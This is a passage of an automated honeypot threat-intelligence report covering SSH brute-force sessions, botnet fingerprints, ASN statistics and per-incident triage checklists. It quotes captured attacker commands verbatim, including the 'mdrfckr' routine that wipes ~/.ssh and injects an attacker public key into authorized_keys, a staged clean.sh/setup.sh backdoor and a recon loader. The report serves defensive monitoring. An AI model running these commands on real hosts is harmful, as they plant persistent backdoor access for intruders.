| `administrator` | `Passw0rd` | `91.92.47.140` | 2026-08-11T08:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1004** |
| Sessions with Fingerprint | **23** |
| Unique HASSH Fingerprints | **23** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 238 |
| OpenSSH | 73 |
| libssh | 40 |
| Paramiko (Python) | 33 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 109 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 97 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 72 | 71 |
| `a2de0f306611...` | Mirai/variant | 28 | 3 |
| `eff4c24daffc...` | Modern SSH client | 9 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 109 | 2 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 97 | 3 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 72 | 71 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 28 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 27 | 7 | — |
| `eff4c24daffc...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 4 | 4 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **15** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 94 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`, `195.178.110.228`, `80.94.92.234`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.144`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.6.75`, `12.156.67.18`, `183.88.232.183`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **266** |
| Unique ASNs | **131** |
| High-Risk ASNs | **102** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 14 | HIGH |
| `AS46562` | Performive LLC | 13 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 13 | HIGH |
| `AS398324` | Censys, Inc. | 10 | HIGH |
| `AS396982` | Google LLC | 10 | HIGH |
| `AS4766` | Korea Telecom | 9 | HIGH |
| `AS22773` | Cox Communications Inc. | 9 | HIGH |
| `AS48721` | Flyservers S.A. | 7 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (361)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f2532de87dd5

| Field | Detail |
|---|---|
| **Source IP** | `219.129.96[.]2` |
| **First Seen** | 2026-08-11 00:00 |
| **Last Seen** | 2026-08-11 00:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:00:39` | `cowrie.session.connect` |
| `2026-08-11 00:00:39` | `cowrie.client.version` |
| `2026-08-11 00:00:39` | `cowrie.client.kex` |
| `2026-08-11 00:00:41` | `cowrie.login.success` |
| `2026-08-11 00:00:42` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.96[.]2` to AbuseIPDB if not already reported
- [ ] Block `219.129.96[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-693a88718238

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 00:00 |
| **Last Seen** | 2026-08-11 00:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:00:39` | `cowrie.session.connect` |
| `2026-08-11 00:00:39` | `cowrie.client.version` |
| `2026-08-11 00:00:39` | `cowrie.client.kex` |
| `2026-08-11 00:00:40` | `cowrie.login.success` |
| `2026-08-11 00:00:40` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:00:40` | `cowrie.direct-tcpip.data` |
| `2026-08-11 00:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313b7a0ddee6

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-08-11 00:00 |
| **Last Seen** | 2026-08-11 00:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:00:47` | `cowrie.session.connect` |
| `2026-08-11 00:00:48` | `cowrie.client.version` |
| `2026-08-11 00:00:48` | `cowrie.client.kex` |
| `2026-08-11 00:00:49` | `cowrie.login.success` |
| `2026-08-11 00:00:50` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62c817a99b8

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-08-11 00:02 |
| **Last Seen** | 2026-08-11 00:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:02:51` | `cowrie.session.connect` |
| `2026-08-11 00:02:51` | `cowrie.client.version` |
| `2026-08-11 00:02:51` | `cowrie.client.kex` |
| `2026-08-11 00:02:53` | `cowrie.login.success` |
| `2026-08-11 00:02:54` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d975958f0486

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-11 00:05 |
| **Last Seen** | 2026-08-11 00:05 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:05:29` | `cowrie.session.connect` |
| `2026-08-11 00:05:29` | `cowrie.client.version` |
| `2026-08-11 00:05:29` | `cowrie.client.kex` |
| `2026-08-11 00:05:30` | `cowrie.login.success` |
| `2026-08-11 00:05:56` | `cowrie.session.params` |
| `2026-08-11 00:05:56` | `cowrie.command.input` |
| `2026-08-11 00:05:56` | `cowrie.log.closed` |
| `2026-08-11 00:05:56` | `cowrie.session.file_upload` |
| `2026-08-11 00:05:56` | `cowrie.session.file_upload` |
| `2026-08-11 00:05:56` | `cowrie.session.file_upload` |
| `2026-08-11 00:05:56` | `cowrie.session.file_upload` |
| `2026-08-11 00:05:56` | `cowrie.session.file_upload` |
| `2026-08-11 00:05:56` | `cowrie.session.file_upload` |
| `2026-08-11 00:05:56` | `cowrie.session.file_upload` |
| `2026-08-11 00:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9346a4ffdbb

| Field | Detail |
|---|---|
| **Source IP** | `152.67.96[.]249` |
| **First Seen** | 2026-08-11 00:07 |
| **Last Seen** | 2026-08-11 00:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:07:53` | `cowrie.session.connect` |
| `2026-08-11 00:07:53` | `cowrie.client.version` |
| `2026-08-11 00:07:53` | `cowrie.client.kex` |
| `2026-08-11 00:07:54` | `cowrie.login.success` |
| `2026-08-11 00:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.67.96[.]249` to AbuseIPDB if not already reported
- [ ] Block `152.67.96[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2787c28871

| Field | Detail |
|---|---|
| **Source IP** | `152.67.96[.]249` |
| **First Seen** | 2026-08-11 00:07 |
| **Last Seen** | 2026-08-11 00:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:07:53` | `cowrie.session.connect` |
| `2026-08-11 00:07:53` | `cowrie.client.version` |
| `2026-08-11 00:07:54` | `cowrie.client.kex` |
| `2026-08-11 00:07:55` | `cowrie.login.success` |
| `2026-08-11 00:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.67.96[.]249` to AbuseIPDB if not already reported
- [ ] Block `152.67.96[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452bd88a46b5

| Field | Detail |
|---|---|
| **Source IP** | `152.67.96[.]249` |
| **First Seen** | 2026-08-11 00:08 |
| **Last Seen** | 2026-08-11 00:10 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:08:11` | `cowrie.session.connect` |
| `2026-08-11 00:08:11` | `cowrie.client.version` |
| `2026-08-11 00:08:12` | `cowrie.client.kex` |
| `2026-08-11 00:08:12` | `cowrie.login.success` |
| `2026-08-11 00:08:14` | `cowrie.session.file_upload` |
| `2026-08-11 00:08:15` | `cowrie.session.params` |
| `2026-08-11 00:08:15` | `cowrie.command.input` |
| `2026-08-11 00:08:15` | `cowrie.command.input` |
| `2026-08-11 00:08:15` | `cowrie.command.input` |
| `2026-08-11 00:08:15` | `cowrie.command.failed` |
| `2026-08-11 00:08:16` | `cowrie.log.closed` |
| `2026-08-11 00:08:17` | `cowrie.session.params` |
| `2026-08-11 00:08:17` | `cowrie.command.input` |
| `2026-08-11 00:08:17` | `cowrie.log.closed` |
| `2026-08-11 00:08:18` | `cowrie.session.params` |
| `2026-08-11 00:08:18` | `cowrie.command.input` |
| `2026-08-11 00:08:18` | `cowrie.log.closed` |
| `2026-08-11 00:08:19` | `cowrie.session.params` |
| `2026-08-11 00:08:19` | `cowrie.command.input` |
| `2026-08-11 00:08:19` | `cowrie.command.failed` |
| `2026-08-11 00:08:19` | `cowrie.command.failed` |
| `2026-08-11 00:09:20` | `cowrie.session.params` |
| `2026-08-11 00:09:20` | `cowrie.command.input` |
| `2026-08-11 00:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.67.96[.]249` to AbuseIPDB if not already reported
- [ ] Block `152.67.96[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3599024b7d

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-08-11 00:18 |
| **Last Seen** | 2026-08-11 00:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:18:58` | `cowrie.session.connect` |
| `2026-08-11 00:18:59` | `cowrie.client.version` |
| `2026-08-11 00:18:59` | `cowrie.client.kex` |
| `2026-08-11 00:19:02` | `cowrie.login.success` |
| `2026-08-11 00:19:03` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abfbcd3fb387

| Field | Detail |
|---|---|
| **Source IP** | `113.28.86[.]1` |
| **First Seen** | 2026-08-11 00:19 |
| **Last Seen** | 2026-08-11 00:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:19:09` | `cowrie.session.connect` |
| `2026-08-11 00:19:09` | `cowrie.client.version` |
| `2026-08-11 00:19:09` | `cowrie.client.kex` |
| `2026-08-11 00:19:11` | `cowrie.login.success` |
| `2026-08-11 00:19:12` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.28.86[.]1` to AbuseIPDB if not already reported
- [ ] Block `113.28.86[.]1` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09c1a43fdd13

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]144` |
| **First Seen** | 2026-08-11 00:26 |
| **Last Seen** | 2026-08-11 00:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:26:16` | `cowrie.session.connect` |
| `2026-08-11 00:26:17` | `cowrie.login.success` |
| `2026-08-11 00:26:17` | `cowrie.session.params` |
| `2026-08-11 00:26:18` | `cowrie.command.input` |
| `2026-08-11 00:26:19` | `cowrie.command.input` |
| `2026-08-11 00:26:19` | `cowrie.command.input` |
| `2026-08-11 00:26:20` | `cowrie.command.input` |
| `2026-08-11 00:26:20` | `cowrie.command.failed` |
| `2026-08-11 00:26:20` | `cowrie.log.closed` |
| `2026-08-11 00:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]144` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903846fd4c4c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:35 |
| **Last Seen** | 2026-08-11 00:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:35:05` | `cowrie.session.connect` |
| `2026-08-11 00:35:05` | `cowrie.client.version` |
| `2026-08-11 00:35:05` | `cowrie.client.kex` |
| `2026-08-11 00:35:08` | `cowrie.login.success` |
| `2026-08-11 00:35:10` | `cowrie.session.params` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.success` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:10` | `cowrie.command.input` |
| `2026-08-11 00:35:11` | `cowrie.log.closed` |
| `2026-08-11 00:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4878aac02e0f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:37 |
| **Last Seen** | 2026-08-11 00:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:37:45` | `cowrie.session.connect` |
| `2026-08-11 00:37:45` | `cowrie.client.version` |
| `2026-08-11 00:37:45` | `cowrie.client.kex` |
| `2026-08-11 00:37:47` | `cowrie.login.success` |
| `2026-08-11 00:37:48` | `cowrie.session.params` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.success` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.command.input` |
| `2026-08-11 00:37:48` | `cowrie.log.closed` |
| `2026-08-11 00:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-252a6a9c3ebb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:40 |
| **Last Seen** | 2026-08-11 00:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:40:38` | `cowrie.session.connect` |
| `2026-08-11 00:40:39` | `cowrie.client.version` |
| `2026-08-11 00:40:39` | `cowrie.client.kex` |
| `2026-08-11 00:40:41` | `cowrie.login.success` |
| `2026-08-11 00:40:42` | `cowrie.session.params` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.success` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:42` | `cowrie.command.input` |
| `2026-08-11 00:40:43` | `cowrie.log.closed` |
| `2026-08-11 00:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec5b54fabdb9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:43 |
| **Last Seen** | 2026-08-11 00:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:43:13` | `cowrie.session.connect` |
| `2026-08-11 00:43:13` | `cowrie.client.version` |
| `2026-08-11 00:43:13` | `cowrie.client.kex` |
| `2026-08-11 00:43:15` | `cowrie.login.success` |
| `2026-08-11 00:43:17` | `cowrie.session.params` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.command.success` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
